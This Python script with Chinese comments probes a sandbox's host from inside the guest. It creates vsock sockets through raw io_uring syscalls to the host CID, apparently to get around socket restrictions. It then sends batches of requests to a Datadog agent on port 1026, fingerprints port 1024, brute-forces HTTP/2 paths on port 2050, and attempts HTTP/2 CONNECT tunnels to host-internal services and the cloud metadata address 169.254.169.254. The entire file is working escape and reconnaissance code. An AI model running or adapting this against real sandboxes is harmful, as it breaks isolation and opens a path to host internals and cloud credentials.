# -*- coding: utf-8 -*-
"""guest_vsock_probe3: vsock host 面深挖
1) 1026 Datadog agent: 每请求独立连接, 批量端点 (debugger 认证 / config / evp_proxy / profiling / symdb)
2) 1024: 协议识别 (HTTP/1.1 路径 / H2)
3) 2050: H2 路径字典 + CONNECT 隧道尝试 (ENABLE_CONNECT_PROTOCOL=1 -> host 内网面)
输出落盘 + 哨兵 VSOCK3_DONE"""
import os, socket, struct, ctypes, time, signal, sys

OUT = '/vercel/sandbox/vsock3.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


signal.alarm(175)

libc = ctypes.CDLL(None, use_errno=True)


def syscall(n, *args):
    libc.syscall.restype = ctypes.c_long
    return libc.syscall(n, *args)


SYS_IO_URING_SETUP = 425
SYS_IO_URING_ENTER = 426
IORING_OFF_SQ_RING = 0
IORING_OFF_SQES = 0x10000000
IORING_OP_SOCKET = 45
IORING_ENTER_GETEVENTS = 1
PROT_RW = 3
MAP_SHARED_POP = 0x8001
AF_VSOCK = 40
CID_HOST = 2


class SQRingOffsets(ctypes.Structure):
    _fields_ = [('head', ctypes.c_uint32), ('tail', ctypes.c_uint32),
                ('ring_mask', ctypes.c_uint32), ('ring_entries', ctypes.c_uint32),
                ('flags', ctypes.c_uint32), ('dropped', ctypes.c_uint32),
                ('array', ctypes.c_uint32), ('resv1', ctypes.c_uint32),
                ('user_addr', ctypes.c_uint64)]


class CQRingOffsets(ctypes.Structure):
    _fields_ = [('head', ctypes.c_uint32), ('tail', ctypes.c_uint32),
                ('ring_mask', ctypes.c_uint32), ('ring_entries', ctypes.c_uint32),
                ('overflow', ctypes.c_uint32), ('cqes', ctypes.c_uint32),
                ('resv', ctypes.c_uint64 * 3)]


class Params(ctypes.Structure):
    _fields_ = [('sq_entries', ctypes.c_uint32), ('cq_entries', ctypes.c_uint32),
                ('flags', ctypes.c_uint32), ('sq_thread_cpu', ctypes.c_uint32),
                ('sq_thread_idle', ctypes.c_uint32), ('features', ctypes.c_uint32),
                ('wq_fd', ctypes.c_uint32), ('resv', ctypes.c_uint32 * 3),
                ('sq_off', SQRingOffsets), ('cq_off', CQRingOffsets)]


def setup_uring(entries=8):
    p = Params()
    rfd = syscall(SYS_IO_URING_SETUP, entries, ctypes.byref(p))
    if rfd < 0:
        log('io_uring_setup FAIL errno=%d' % ctypes.get_errno())
        return None
    libc.mmap.restype = ctypes.c_void_p
    libc.mmap.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_long]
    sq_sz = p.sq_off.array + p.sq_entries * 4
    cq_sz = p.cq_off.cqes + p.cq_entries * 16
    msz = max(sq_sz, cq_sz)
    base = libc.mmap(None, msz, PROT_RW, MAP_SHARED_POP, rfd, IORING_OFF_SQ_RING)
    if base == ctypes.c_void_p(-1).value:
        return None
    cq_base = base if (p.features & 1) else libc.mmap(None, cq_sz, PROT_RW, MAP_SHARED_POP, rfd, 0x8000000)
    sqes = libc.mmap(None, p.sq_entries * 64, PROT_RW, MAP_SHARED_POP, rfd, IORING_OFF_SQES)
    return {'fd': rfd, 'p': p, 'base': base, 'cq_base': cq_base, 'sqes': sqes}


def u32(base, off):
    return ctypes.cast(base + off, ctypes.POINTER(ctypes.c_uint32))


def submit(ur, opcode, fd=0, off=0, addr=0, ud=1):
    p = ur['p']
    tail = u32(ur['base'], p.sq_off.tail)[0]
    idx = tail & u32(ur['base'], p.sq_off.ring_mask)[0]
    sqe = ur['sqes'] + idx * 64
    ctypes.memset(sqe, 0, 64)
    ctypes.c_uint8.from_address(sqe).value = opcode
    ctypes.c_int32.from_address(sqe + 4).value = fd
    ctypes.c_uint64.from_address(sqe + 8).value = off
    ctypes.c_uint64.from_address(sqe + 16).value = addr
    ctypes.c_uint64.from_address(sqe + 32).value = ud
    u32(ur['base'], p.sq_off.array)[idx] = idx
    u32(ur['base'], p.sq_off.tail)[0] = tail + 1
    n = syscall(SYS_IO_URING_ENTER, ur['fd'], 1, 0, IORING_ENTER_GETEVENTS, 0, 0)
    if n < 0:
        return -ctypes.get_errno()
    dl = time.time() + 3
    while u32(ur['cq_base'], p.cq_off.head)[0] == u32(ur['cq_base'], p.cq_off.tail)[0] and time.time() < dl:
        time.sleep(0.005)
    if u32(ur['cq_base'], p.cq_off.head)[0] == u32(ur['cq_base'], p.cq_off.tail)[0]:
        return -999
    cqe = ur['cq_base'] + p.cq_off.cqes + (
        u32(ur['cq_base'], p.cq_off.head)[0] & u32(ur['cq_base'], p.cq_off.ring_mask)[0]) * 16
    res = ctypes.c_int32.from_address(cqe + 8).value
    u32(ur['cq_base'], p.cq_off.head)[0] += 1
    return res


ur = setup_uring()
if not ur:
    log('VSOCK3_DONE')
    f.close()
    sys.exit(0)


def vsock_connect(port, timeout=2.0):
    res = submit(ur, IORING_OP_SOCKET, fd=AF_VSOCK, off=1, addr=0)
    if res < 0:
        return None, 'socket_res=%d' % res
    try:
        s = socket.socket(family=socket.AF_VSOCK, type=socket.SOCK_STREAM, fileno=res)
        s.settimeout(timeout)
        s.connect((CID_HOST, port))
        return s, None
    except Exception as e:
        try:
            os.close(res)
        except Exception:
            pass
        return None, '%s errno=%s' % (type(e).__name__, getattr(e, 'errno', ''))


def recv_all(s, t=2.0):
    s.settimeout(t)
    data = b''
    try:
        while len(data) < 131072:
            c = s.recv(8192)
            if not c:
                break
            data += c
    except socket.timeout:
        pass
    except Exception as e:
        pass
    return data


def h2_frame(t, flags, stream, payload):
    return struct.pack('>I', len(payload))[1:] + bytes([t, flags]) + struct.pack('>I', stream) + payload


def http_req(port, raw_req, label, rtime=2.5):
    """独立连接发请求"""
    s, err = vsock_connect(port, timeout=rtime)
    if not s:
        log('%s CONNECT_FAIL %s' % (label, err))
        return b''
    try:
        s.sendall(raw_req)
        data = recv_all(s, rtime)
        head = data[:150].decode('latin1', 'replace').replace('\r', '\\r').replace('\n', '\\n')
        log('%s rcvd %dB: %s' % (label, len(data), head))
        return data
    except Exception as e:
        log('%s EXC %s' % (label, type(e).__name__))
        return b''
    finally:
        try:
            s.close()
        except Exception:
            pass


# ---- 1) 1026 批量端点 (每请求独立连接) ----
log('=== 1026 Datadog agent 批量端点 ===')
reqs = [
    ('dbg2-empty', 'POST /debugger/v2/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}'),
    ('dbg2-requests', 'POST /debugger/v2/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 14\r\nConnection: close\r\n\r\n{"requests":[]}'),
    ('dbg1-empty', 'POST /debugger/v1/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}'),
    ('dbg1-diag', 'GET /debugger/v1/diagnostics HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'),
    ('config-set', 'POST /config/set HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}'),
    ('v07-config', 'GET /v0.7/config HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'),
    ('profiling', 'POST /profiling/v1/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}'),
    ('symdb', 'POST /symdb/v1/input HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}'),
    ('evp1', 'GET /evp_proxy/v1/ HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'),
    ('evp2-intake', 'GET /evp_proxy/v1/api/v2/series HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'),
    ('dogstatsd1', 'POST /dogstatsd/v1/proxy HTTP/1.1\r\nHost: localhost\r\nContent-Type: text/plain\r\nContent-Length: 6\r\nConnection: close\r\n\r\ncount:1|c'),
    ('flare', 'POST /tracer_flare/v1 HTTP/1.1\r\nHost: localhost\r\nContent-Length: 2\r\nConnection: close\r\n\r\n{}'),
    ('traces07', 'POST /v0.7/traces HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n[]'),
    ('services07', 'GET /v0.7/services HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n'),
    ('stats06', 'POST /v0.6/stats HTTP/1.1\r\nHost: localhost\r\nContent-Type: application/json\r\nContent-Length: 2\r\nConnection: close\r\n\r\n[]'),
]
for name, req in reqs:
    http_req(1026, req.encode(), name, 2.0)
    time.sleep(0.3)

# ---- 2) 1024 协议识别 ----
log('=== 1024 协议识别 ===')
http_req(1024, b'GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', '1024-http1', 2.0)
http_req(1024, b'GET /info HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n', '1024-info', 2.0)
http_req(1024, b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n', '1024-h2preface', 1.5)
http_req(1024, b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01', '1024-grpc-ish', 1.5)

# ---- 3) 2050 H2 路径字典 + CONNECT ----
log('=== 2050 H2 路径字典 ===')
paths = ['/', '/info', '/health', '/healthz', '/ping', '/version', '/status', '/debug', '/metrics', '/v1/health']
for path in paths:
    s, err = vsock_connect(2050, timeout=2.5)
    if not s:
        log('2050 CONNECT_FAIL %s' % err)
        continue
    try:
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(h2_frame(4, 0, 0, b''))
        time.sleep(0.3)
        d = recv_all(s, 0.8)
        if d:
            s.sendall(h2_frame(4, 1, 0, b''))
        # HPACK: :method GET(0x82), :scheme http(0x86), :path literal, :authority literal
        pv = path.encode()
        hp = b'\x82\x86' + b'\x44' + bytes([len(pv)]) + pv + b'\x41\x09localhost'
        s.sendall(h2_frame(1, 0x5, 1, hp))
        time.sleep(0.6)
        d2 = recv_all(s, 1.8)
        # 提取响应行
        status = '?'
        if len(d2) >= 9:
            # 找 HEADERS 帧
            off = 0
            while off + 9 <= len(d2):
                ln = int.from_bytes(d2[off:off + 3], 'big')
                typ = d2[off + 3]
                if typ == 1:
                    pay = d2[off + 9:off + 9 + ln]
                    # HPACK 响应头里 :status 通常是 index 8 (0x88) 或 literal
                    status = 'hdr:%s' % pay.hex()
                    break
                off += 9 + ln
        log('2050 GET %s -> status=%s len=%d hex=%s' % (path, status, len(d2), d2[:60].hex()))
    except Exception as e:
        log('2050 %s EXC %s' % (path, type(e).__name__))
    try:
        s.close()
    except Exception:
        pass
    time.sleep(0.3)

log('=== 2050 CONNECT 隧道尝试 ===')
for target in [b'localhost:8126', b'127.0.0.1:8126', b'localhost:80', b'169.254.169.254:80']:
    s, err = vsock_connect(2050, timeout=3)
    if not s:
        log('2050 CONNECT_FAIL %s' % err)
        continue
    try:
        s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
        s.sendall(h2_frame(4, 0, 0, b''))
        time.sleep(0.3)
        d = recv_all(s, 0.8)
        if d:
            s.sendall(h2_frame(4, 1, 0, b''))
        hp = b'\x42\x0aCONNECT' + b'\x41' + bytes([len(target)]) + target
        s.sendall(h2_frame(1, 0x4, 1, hp))  # END_HEADERS only, 保持隧道
        time.sleep(0.8)
        d2 = recv_all(s, 2.0)
        log('2050 CONNECT %s -> %dB hex=%s' % (target.decode(), len(d2), d2[:80].hex()))
        if d2 and len(d2) >= 9:
            ln = int.from_bytes(d2[0:3], 'big')
            typ = d2[3]
            log('  first frame type=%d len=%d payload=%s' % (typ, ln, d2[9:9 + min(ln, 60)].hex()))
    except Exception as e:
        log('2050 CONNECT %s EXC %s' % (target.decode(), type(e).__name__))
    try:
        s.close()
    except Exception:
        pass
    time.sleep(0.4)

log('VSOCK3_DONE')
f.close()
